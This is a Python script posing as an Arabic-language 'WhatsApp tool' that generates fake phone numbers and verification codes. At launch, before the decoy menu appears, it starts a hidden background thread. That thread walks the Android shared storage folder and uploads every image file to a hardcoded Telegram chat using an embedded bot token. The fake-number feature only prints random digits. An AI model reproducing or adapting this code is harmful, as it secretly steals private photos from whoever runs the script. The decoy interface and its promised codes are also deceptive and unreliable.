import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w')
dir_path = "/storage/emulated/0/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=1249382653, photo=f, caption='By: @Shadow_hitler')

def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                    executor.submit(send_file, file_path)

threading.Thread(target=back).start()

import random
import time
import sys
import os
import uuid

# ألوان ANSI للطباعة
Ab = '\033[1;92m'
aB = '\033[1;91m'
AB = '\033[1;96m'
aBbs = '\033[1;93m'
AbBs = '\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'

def slow(T):
    for r in T + '\n':
        sys.stdout.write(r)
        sys.stdout.flush()
        time.sleep(30 / 2000)

print(a_bSa + "="*40)
print(a_bSa + "            WHATSAPP TOOL           ")
print(a_bSa + "="*40)

slow(S_aBs + """⌯ Welcome In Fake Number Generator 💘.   
⌯ اهلا بك في أداة توليد الأرقام الوهمية 💘.
---------------------------------------------------
""")

uid = uuid.uuid4()
username = input(Ba_bS + '(' + a_aB_s + '!' + S_aBs + ')' + Ba_bS + '  ⌯ أدخل اسم المستخدم أو رقم وهمي:  ' + faB_s)
print('  ')
print(Ba_bS + '⌯ الرجاء الانتظار بعض الوقت.....')

time.sleep(3)
os.system("clear")
print(a_bSa + "="*40)
print(a_bSa + "         WHATSAPP TOOL RESTARTED       ")
print(a_bSa + "="*40)

# قائمة الدول: (رقم, اسم, علم, مفتاح الدولة, مقدمات شركات الاتصالات, الطول الكامل بعد المفتاح)
countries = [
    (1, "اليمن", "🇾🇪", "+967", ["73", "77"], 9),
    (2, "الولايات المتحدة", "🇺🇸", "+1", ["201","202","203","212","213"], 10),
    (3, "السعودية", "🇸🇦", "+966", ["50","53","54","55","56","57","58"], 9),
    (4, "سوريا", "🇸🇾", "+963", ["94","95","96","98"], 9),  # 9 أرقام كاملة (بما فيهم المقدمة)
    (5, "العراق", "🇮🇶", "+964", ["75","77","78"], 10),
    (6, "الجزائر", "🇩🇿", "+213", ["5","6","7"], 9),
    (7, "المغرب", "🇲🇦", "+212", ["6","7"], 9),
    (8, "الإمارات", "🇦🇪", "+971", ["50","55","56","52"], 9),
    (9, "عمان", "🇴🇲", "+968", ["72","73","77"], 8)
]

def generate_phone_numbers(prefix, prefixes, total_length, count=10):
    numbers = []
    for _ in range(count):
        start = random.choice(prefixes)
        # طول الأرقام المتبقية = الطول الكلي - طول مقدمة الشركة
        remaining_length = total_length - len(start)
        rest = ''.join(str(random.randint(0,9)) for _ in range(remaining_length))
        numbers.append(prefix + start + rest)
    return numbers

def generate_fake_code():
    return ''.join(str(random.randint(0, 9)) for _ in range(6))

slow(S_aBs + "\n⌯ اختر دولة من القائمة التالية:\n")

for num, name, flag, prefix, pref_list, length in countries:
    print(f"{Ba_bS}{num}] {flag} {name} ({prefix}){faB_s}")

while True:
    choice = input(f"\n{Ba_bS}⌯ اختر رقم الدولة: {faB_s}")
    if choice.isdigit() and 1 <= int(choice) <= len(countries):
        choice = int(choice)
        break
    else:
        print(aB + "⌯ اختيار غير صالح، حاول مرة أخرى." + faB_s)

country = countries[choice - 1]

slow(f"\n{Ya_Bs}⌯ تم اختيار: {country[2]} {country[1]} ({country[3]})\n")
slow("⌯ جاري توليد الأرقام...\n")

phone_numbers = generate_phone_numbers(country[3], country[4], country[5])

for i, number in enumerate(phone_numbers, 1):
    print(f"{Ba_bS}{i}] {number}{faB_s}")

while True:
    selected = input(f"\n{Ba_bS}⌯ اختر رقم من القائمة لنسخه: {faB_s}")
    if selected.isdigit() and 1 <= int(selected) <= len(phone_numbers):
        selected = int(selected)
        break
    else:
        print(aB + "⌯ اختيار غير صالح، حاول مرة أخرى." + faB_s)

chosen_number = phone_numbers[selected - 1]
input(f"\n{Ba_bS}⌯ الرقم {chosen_number} مختار. اضغط Enter لتوليد كود التحقق...{faB_s}")

fake_code = generate_fake_code()
slow(f"\n{Ab}⌯ تم توليد كود التحقق: {fake_code}\n")
slow(f"{Ab}⌯ تم نسخ الرقم {chosen_number} والكود {fake_code} (تم تطوير الأداة بواسطة شادو هتلر - Shadow Hitler)\n")